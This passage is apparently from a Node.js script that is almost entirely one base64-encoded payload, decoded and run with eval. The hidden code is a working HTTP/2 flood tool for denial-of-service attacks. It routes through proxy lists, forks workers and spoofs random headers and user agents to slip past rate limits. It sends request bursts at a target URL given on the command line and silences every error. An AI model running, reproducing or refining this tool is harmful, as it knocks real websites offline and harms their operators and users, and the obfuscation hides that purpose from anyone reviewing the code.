phY2NlcHRfaGVhZGVyLmxlbmd0aCldfSwKICAgeyJDYWNoZS1Db250cm9sIiA6ICduby1jYWNoZSd9LAogICB7InByYWdtYSIgOiAibm8tY2FjaGUifSwKICAgeyJ4LXhzcy1wcm90ZWN0aW9uIiA6ICIxO21vZGU9YmxvY2sifSwgCiAgIHsieC1jb250ZW50LXR5cGUtb3B0aW9ucyIgOiAibm9zbmlmZiJ9LAogICB7J2FjY2VwdC1kYXRldGltZScgOiBhY2NlcHRfaGVhZGVyW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSphY2NlcHRfaGVhZGVyLmxlbmd0aCldfSwKICAgXTsKICAgY29uc3QgcmF0ZUhlYWRlcnMyID0gWwogICB7ICJha2FtYWktb3JpZ2luLWhvcCI6IHJhbmRzdHIoNSkgIH0sCiAgIHsgInNvdXJjZS1pcCI6IHJhbmRzdHIoNSkgIH0sCiAgIHsgInZpYSI6IHJhbmRzdHIoNSkgIH0sCiAgIHsiWC1WZXJjZWwtQ2FjaGUiOiByYW5kc3RyKDUpIH0sCiAgIHsgImNsdXN0ZXItaXAiOiByYW5kc3RyKDUpICB9LAogICB7IlgtUmVxdWVzdGVkLVdpdGgiOiAnWE1MSHR0cFJlcXVlc3QnfSwKICAgeyJYLUZyYW1lLU9wdGlvbnMiOiAiZGVueSJ9LAogICB7J01heC1Gb3J3YXJkcyc6ICcxMCd9LAogICB7J1JlZnJlc2gnOiAnNSd9LAogICB7J2FjY2VwdC1sYW5ndWFnZScgOiBsYW5ndWFnZV9oZWFkZXJbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKmxhbmd1YWdlX2hlYWRlci5sZW5ndGgpXX0sCiAgIHsnYWNjZXB0LWVuY29kaW5nJyA6IEdlbmVyYXRlX0VuY29kaW5nW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpHZW5lcmF0ZV9FbmNvZGluZy5sZW5ndGgpXX0KICAgXTsKY29uc3QgZHluSGVhZGVycyA9IHsKICAgLi4uaGVhZGVycywKICAgLi4ucmF0ZUhlYWRlcnMyW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpyYXRlSGVhZGVycy5sZW5ndGgpXSwKICAgLi4ucmF0ZUhlYWRlcnNbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKnJhdGVIZWFkZXJzLmxlbmd0aCldCiB9Owpjb25zdCBhcmdzID0gewogICAgdGFyZ2V0OiBwcm9jZXNzLmFyZ3ZbMl0sCiAgICB0aW1lOiB+fnByb2Nlc3MuYXJndlszXSwKICAgIFJhdGU6IH5+cHJvY2Vzcy5hcmd2WzRdLAogICAgdGhyZWFkczogfn5wcm9jZXNzLmFyZ3ZbNV0sCiAgICBwcm94eUZpbGU6IHByb2Nlc3MuYXJndls2XQp9Cgp2YXIgcHJveGllcyA9IHJlYWRMaW5lcyhhcmdzLnByb3h5RmlsZSk7CmNvbnN0IHBhcnNlZFRhcmdldCA9IHVybC5wYXJzZShhcmdzLnRhcmdldCk7CmNvbG9ycy5lbmFibGUoKTsKY29uc3QgY29sb3JlZFN0cmluZyA9ICJhdHRhY2sgaGFyZCB0YXJnZXQiLndoaXRlOwppZiAoY2x1c3Rlci5pc01hc3RlcikgewogICBmb3IgKGxldCBjb3VudGVyID0gMTsgY291bnRlciA8PSBhcmdzLnRocmVhZHM7IGNvdW50ZXIrKykgewogICBjb25zb2xlLmxvZygnSG9zdDogJytwcm9jZXNzLmFyZ3ZbMl0pOwogY29uc29sZS5sb2coJ1RpbWU6ICcrcHJvY2Vzcy5hcmd2WzNdKTsKIGNvbnNvbGUubG9nKCdSYXRlOiAnK3Byb2Nlc3MuYXJndls0XSk7CiBjb25zb2xlLmxvZygnVGhyZWFkKHMpOiAnK3Byb2Nlc3MuYXJndls1XSk7CiBjb25zb2xlLmxvZyhgUHJveHlGaWxlOiAke2FyZ3MucHJveHlGaWxlfSB8IFRvdGFsOiAke3Byb3hpZXMubGVuZ3RofWApOwogICAgICAgY2x1c3Rlci5mb3JrKCk7CgogICB9Cn0gZWxzZSB7Zm9yIChsZXQgaSA9IDA7IGkgPCAxMDsgaSsrKSB7IHNldEludGVydmFsKHJ1bkZsb29kZXIsIDEpIH19CgpjbGFzcyBOZXRTb2NrZXQgewogICAgY29uc3RydWN0b3IoKXt9CgogSFRUUChvcHRpb25zLCBjYWxsYmFjaykgewogICAgY29uc3QgcGFyc2VkQWRkciA9IG9wdGlvbnMuYWRkcmVzcy5zcGxpdCgiOiIpOwogICAgY29uc3QgYWRkckhvc3QgPSBwYXJzZWRBZGRyWzBdOwogICAgY29uc3QgcGF5bG9hZCA9ICJDT05ORUNUICIgKyBvcHRpb25zLmFkZHJlc3MgKyAiOjQ0MyBIVFRQLzEuMVxyXG5Ib3N0OiAiICsgb3B0aW9ucy5hZGRyZXNzICsgIjo0NDNcclxuQ29ubmVjdGlvbjogS2VlcC1BbGl2ZVxyXG5cclxuIjsgLy9LZWVwIEFsaXZlCiAgICBjb25zdCBidWZmZXIgPSBuZXcgQnVmZmVyLmZyb20ocGF5bG9hZCk7CgogICAgY29uc3QgY29ubmVjdGlvbiA9IG5ldC5jb25uZWN0KHsKICAgICAgICBob3N0OiBvcHRpb25zLmhvc3QsCiAgICAgICAgcG9ydDogb3B0aW9ucy5wb3J0LAogICAgICAgIGFsbG93SGFsZk9wZW46IHRydWUsCiAgICAgICAgd3JpdGFibGU6IHRydWUsCiAgICAgICAgcmVhZGFibGU6IHRydWUKICAgIH0pOwoKICAgIGNvbm5lY3Rpb24uc2V0VGltZW91dChvcHRpb25zLnRpbWVvdXQgKiA2MDAwMDApOwogICAgY29ubmVjdGlvbi5zZXRLZWVwQWxpdmUodHJ1ZSwgMTAwMDAwKTsKICAgIGNvbm5lY3Rpb24uc2V0Tm9EZWxheSh0cnVlKQogICAgY29ubmVjdGlvbi5vbigiY29ubmVjdCIsICgpID0+IHsKICAgICAgIGNvbm5lY3Rpb24ud3JpdGUoYnVmZmVyKTsKICAgfSk7CgogICBjb25uZWN0aW9uLm9uKCJkYXRhIiwgY2h1bmsgPT4gewogICAgICAgY29uc3QgcmVzcG9uc2UgPSBjaHVuay50b1N0cmluZygidXRmLTgiKTsKICAgICAgIGNvbnN0IGlzQWxpdmUgPSByZXNwb25zZS5pbmNsdWRlcygiSFRUUC8xLjEgMjAwIik7CiAgICAgICBpZiAoaXNBbGl2ZSA9PT0gZmFsc2UpIHsKICAgICAgICAgICBjb25uZWN0aW9uLmRlc3Ryb3koKTsKICAgICAgICAgICByZXR1cm4gY2FsbGJhY2sodW5kZWZpbmVkLCAiZXJyb3I6IGludmFsaWQgcmVzcG9uc2UgZnJvbSBwcm94eSBzZXJ2ZXIiKTsKICAgICAgIH0KICAgICAgIHJldHVybiBjYWxsYmFjayhjb25uZWN0aW9uLCB1bmRlZmluZWQpOwogICB9KTsKCiAgIGNvbm5lY3Rpb24ub24oInRpbWVvdXQiLCAoKSA9PiB7CiAgICAgICBjb25uZWN0aW9uLmRlc3Ryb3koKTsKICAgICAgIHJldHVybiBjYWxsYmFjayh1bmRlZmluZWQsICJlcnJvcjogdGltZW91dCBleGNlZWRlZCIpOwogICB9KTsKCn0KfQpmdW5jdGlvbiBjb29raWVTdHJpbmcoY29va2llKSB7CiAgIHZhciBzID0gIiI7CiAgIGZvciAodmFyIGMgaW4gY29va2llKSB7CiAgICAgcyA9IGAke3N9ICR7Y29va2llW2NdLm5hbWV9PSR7Y29va2llW2NdLnZhbHVlfTtgOwogICB9CiAgIHZhciBzID0gcy5zdWJzdHJpbmcoMSk7CiAgIHJldHVybiBzLnN1YnN0cmluZygwLCBzLmxlbmd0aCAtIDEpOwogfQoKY29uc3QgU29ja2VyID0gbmV3IE5ldFNvY2tldCgpOwoKZnVuY3Rpb24gcmVhZExpbmVzKGZpbGVQYXRoKSB7CiAgICByZXR1cm4gZnMucmVhZEZpbGVTeW5jKGZpbGVQYXRoLCAidXRmLTgiKS50b1N0cmluZygpLnNwbGl0KC9ccj9cbi8pOwp9CgoKZnVuY3Rpb24gcmFuZG9tSW50bihtaW4sIG1heCkgewogICAgcmV0dXJuIE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIChtYXggLSBtaW4pICsgbWluKTsKfQoKZnVuY3Rpb24gcmFuZG9tRWxlbWVudChlbGVtZW50cykgewogICAgcmV0dXJuIGVsZW1lbnRzW3JhbmRvbUludG4oMCwgZWxlbWVudHMubGVuZ3RoKV07Cn0KZnVuY3Rpb24gcnVuRmxvb2RlcigpIHsKICAgIGNvbnN0IHByb3h5QWRkciA9IHJhbmRvbUVsZW1lbnQocHJveGllcyk7CiAgICBjb25zdCBwYXJzZWRQcm94eSA9IHByb3h5QWRkci5zcGxpdCgiOiIpOwogICAgY29uc3QgcGFyc2VkUG9ydCA9IHBhcnNlZFRhcmdldC5wcm90b2NvbCA9PSAiaHR0cHM6IiA/ICI0NDMiIDogIjgwIgoKICAgIGxldCB1c2VyQWdlbnQgPSByYW5kb21Vc2VyYWdlbnQuZ2V0UmFuZG9tKGZ1bmN0aW9uICh1YSkgewogICAgICAgcmV0dXJuIHVhLmJyb3dzZXJOYW1lID09PSAnRmlyZWZveCc7CiAgIH0pOwoKICAgbGV0IGhlYWRlcnMgPSB7CiAgICAgICAiOmF1dGhvcml0eSI6IE1hdGgucmFuZG9tKCkgPCAwLjUgPyBwYXJzZWRUYXJnZXQuaG9zdCArIChNYXRoLnJhbmRvbSgpIDwgMC41ID8gJy4nIDogJycpIDogKCd3d3cuJysgcGFyc2VkVGFyZ2V0Lmhvc3QgKyAoTWF0aC5yYW5kb20oKSA8IDAuNSA/ICcuJyA6ICcnKSksCiAgICAgICAiOm1ldGhvZCI6ICJHRVQiLAogICAgICAgInJlZmVyZXIiIDogImh0dHBzOi8vIiArIHBhcnNlZFRhcmdldC5ob3N0ICsgcGFyc2VkVGFyZ2V0LnBhdGgsCiAgICAgICAiQWNjZXB0IiA6IGFjY2VwdF9oZWFkZXJbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogYWNjZXB0X2hlYWRlci5sZW5ndGgpXSwKICAgICAgICI6cGF0aCI6IHBhcnNlZFRhcmdldC5wYXRoICsgIj9GVUNLWU9VIiwKICAgICAgICI6c2NoZW1lIjogImh0dHBzIiwKICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIiA6ICJYTUxIdHRwUmVxdWVzdCIsCiAgICAgICAidXNlci1hZ2VudCI6IHVhcCwKICAgfQoKICAgIGNvbnN0IHByb3h5T3B0aW9ucyA9IHsKICAgICAgICBob3N0OiBwYXJzZWRQcm94eVswXSwKICAgICAgICBwb3J0OiB+fnBhcnNlZFByb3h5WzFdLAogICAgICAgIGFkZHJlc3M6IHBhcnNlZFRhcmdldC5ob3N0ICsgIjo0NDMiLAogICAgICAgIHRpbWVvdXQ6IDEwMAogICAgfTsKCiAgICBTb2NrZXIuSFRUUChwcm94eU9wdGlvbnMsIChjb25uZWN0aW9uLCBlcnJvcikgPT4gewogICAgICAgIGlmIChlcnJvcikgcmV0dXJuCgogICAgICAgIGNvbm5lY3Rpb24uc2V0S2VlcEFsaXZlKHRydWUsIDEwMDAwMCk7CiAgICAgICAgY29ubmVjdGlvbi5zZXROb0RlbGF5KHRydWUpCgogICAgICAgIGNvbnN0IHNldHRpbmdzID0gewogICAgICAgICAgIGVuYWJsZVB1c2g6IGZhbHNlLAogICAgICAgICAgIGluaXRpYWxXaW5kb3dTaXplOiAxMDczNzQxODIzCiAgICAgICB9OwoKICAgICAgICBjb25zdCB0bHNPcHRpb25zID0gewogICAgICAgICAgIHBvcnQ6IHBhcnNlZFBvcnQsCiAgICAgICAgICAgc2VjdXJlOiB0cnVlLAogICAgICAgICAgIEFMUE5Qcm90b2NvbHM6IFsKICAgICAgICAgICAgICAgImgyIiwiaDMiLCJodHRwLzEuMSIKICAgICAgICAgICBdLAogICAgICAgICAgIGNpcGhlcnM6IGNpcGhlcnMsCiAgICAgICAgICAgc2lnYWxnczogc2lnYWxncywKICAgICAgICAgICByZXF1ZXN0Q2VydDogdHJ1ZSwKICAgICAgICAgICBzb2NrZXQ6IGNvbm5lY3Rpb24sCiAgICAgICAgICAgZWNkaEN1cnZlOiBlY2RoQ3VydmUsCiAgICAgICAgICAgaG9ub3JDaXBoZXJPcmRlcjogZmFsc2UsCiAgICAgICAgICAgZm9sbG93QWxsUmVkaXJlY3RzOiB0cnVlLAogICAgICAgICAgIGNoYWxsZW5nZVRvU29sdmU6IDQ1LAogICAgICAgICAgIGNsaWVudFRpbWVvdXQ6IDIwMDAwLAogICAgICAgICAgIGNsaWVudGxhcmVNYXhUaW1lb3V0OiA1MDAwLAogICAgICAgICAgIGhvc3Q6IHBhcnNlZFRhcmdldC5ob3N0LAogICAgICAgICAgIHJlamVjdFVuYXV0aG9yaXplZDogZmFsc2UsCiAgICAgICAgICAgY2xpZW50Q2VydEVuZ2luZTogIkRZTkFNSUMiLAogICAgICAgICAgIHNlY3VyZU9wdGlvbnM6IHNlY3VyZU9wdGlvbnMsCiAgICAgICAgICAgc2VjdXJlQ29udGV4dDogc2VjdXJlQ29udGV4dCwKICAgICAgICAgICBzZXJ2ZXJuYW1lOiBwYXJzZWRUYXJnZXQuaG9zdCwKICAgICAgICAgICBzZWN1cmVQcm90b2NvbDogc2VjdXJlUHJvdG9jb2wKICAgICAgIH07CgogICAgICAgIGNvbnN0IHRsc0Nvbm4gPSB0bHMuY29ubmVjdChwYXJzZWRQb3J0LCBwYXJzZWRUYXJnZXQuaG9zdCwgdGxzT3B0aW9ucyk7IAoKICAgICAgICB0bHNDb25uLmFsbG93SGFsZk9wZW4gPSB0cnVlOwogICAgICAgIHRsc0Nvbm4uc2V0Tm9EZWxheSh0cnVlKTsKICAgICAgICB0bHNDb25uLnNldEtlZXBBbGl2ZSh0cnVlLCA2MCAqIDEwMDAwMCk7CiAgICAgICAgdGxzQ29ubi5zZXRNYXhMaXN0ZW5lcnMoMCk7CgogICAgICAgIGNvbnN0IGNsaWVudCA9IGh0dHAyLmNvbm5lY3QocGFyc2VkVGFyZ2V0LmhyZWYsIHsKICAgICAgICAgICBwcm90b2NvbDogImh0dHBzOiIsCiAgICAgICAgICAgc2V0dGluZ3M6IHsKICAgICAgICAgICAgICAgaGVhZGVyVGFibGVTaXplOiA2NTUzNiwKICAgICAgICAgICAgICAgbWF4Q29uY3VycmVudFN0cmVhbXM6IDEwMDAsCiAgICAgICAgICAgICAgIGluaXRpYWxXaW5kb3dTaXplOiA2MjkxNDU2LAogICAgICAgICAgICAgICBtYXhIZWFkZXJMaXN0U2l6ZTogMjYyMTQ0LAogICAgICAgICAgICAgICBlbmFibGVQdXNoOiBmYWxzZQogICAgICAgICAgIH0sCiAgICAgICAgICAgbWF4U2Vzc2lvbk1lbW9yeTogMzMzMywKICAgICAgICAgICBtYXhEZWZsYXRlRHluYW1pY1RhYmxlU2l6ZTogNDI5NDk2NzI5NSwKICAgICAgICAgICBjcmVhdGVDb25uZWN0aW9uOiAoKSA9PiB0bHNDb25uLAogICAgICAgICAgIHNvY2tldDogY29ubmVjdGlvbiwKICAgICAgIH0pOwoKICAgICAgIGNsaWVudC5zZXR0aW5ncyh7CiAgICAgICAgICAgaGVhZGVyVGFibGVTaXplOiA2NTUzNiwKICAgICAgICAgICBtYXhDb25jdXJyZW50U3RyZWFtczogMTAwMCwKICAgICAgICAgICBpbml0aWFsV2luZG93U2l6ZTogNjI5MTQ1NiwKICAgICAgICAgICBtYXhIZWFkZXJMaXN0U2l6ZTogMjYyMTQ0LAogICAgICAgICAgIG1heEZyYW1lU2l6ZSA6IDQwMDAwLAogICAgICAgICAgIGVuYWJsZVB1c2g6IGZhbHNlCiAgICAgICB9KTsKCiAgICAgICBjbGllbnQuc2V0TWF4TGlzdGVuZXJzKDApOwogICAgICAgY2xpZW50LnNldHRpbmdzKHNldHRpbmdzKTsKCiAgICAgICAgY2xpZW50Lm9uKCJjb25uZWN0IiwgKCkgPT4gewogICAgICAgICAgIGNvbnN0IEludGVydmFsQXR0YWNrID0gc2V0SW50ZXJ2YWwoKCkgPT4gewogICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFyZ3MuUmF0ZTsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgIGNvbnN0IHJlcXVlc3QgPSBjbGllbnQucmVxdWVzdChoZWFkZXJzKQogICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgICAgLm9uKCJyZXNwb25zZSIsIHJlc3BvbnNlID0+IHsKICAgICAgICAgICAgICAgICAgICAgICBpZihyZXNwb25zZVsnc2V0LWNvb2tpZSddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnNbImNvb2tpZSJdID0gY29va2llU3RyaW5nKHNjcC5wYXJzZShyZXNwb25zZVsic2V0LWNvb2tpZSJdKSkKICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgcmVxdWVzdC5jbG9zZSgpOwogICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3QuZGVzdHJveSgpOwogICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICByZXF1ZXN0LmVuZCgpOwogICAgICAgICAgICAgICB9CiAgICAgICAgICAgfSwgNTUwKTsgCiAgICAgICAgfSk7CgogICAgICAgIGNsaWVudC5vbigiY2xvc2UiLCAoKSA9PiB7CiAgICAgICAgICAgIGNsaWVudC5kZXN0cm95KCk7CiAgICAgICAgICAgIGNvbm5lY3Rpb24uZGVzdHJveSgpOwogICAgICAgICAgICByZXR1cm4KICAgICAgICB9KTsKCiAgICAgICAgY2xpZW50Lm9uKCJlcnJvciIsIGVycm9yID0+IHsKICAgICAgICAgICAgY2xpZW50LmRlc3Ryb3koKTsKICAgICAgICAgICAgY29ubmVjdGlvbi5kZXN0cm95KCk7CiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0pOwogICAgfSk7Cn0KCmNvbnN0IFN0b3BTY3JpcHQgPSAoKSA9PiBwcm9jZXNzLmV4aXQoMSk7CgpzZXRUaW1lb3V0KFN0b3BTY3JpcHQsIGFyZ3MudGltZSAqIDEwMDApOwoKcHJvY2Vzcy5vbigndW5jYXVnaHRFeGNlcHRpb24nLCBlcnJvciA9PiB7fSk7CnByb2Nlc3Mub24oJ3VuaGFuZGxlZFJlamVjdGlvbicsIGVycm9yID0+IHt9KTsKY29uc3QgY2xpZW50ID0gaHR0cDIuY29ubmVjdChwYXJzZWQuaHJlZiwgY2xpZW50T3B0aW9ucywgZnVuY3Rpb24oKSB7CiB9KTsKCg==", "base64").toString("utf-8");
eval(code);
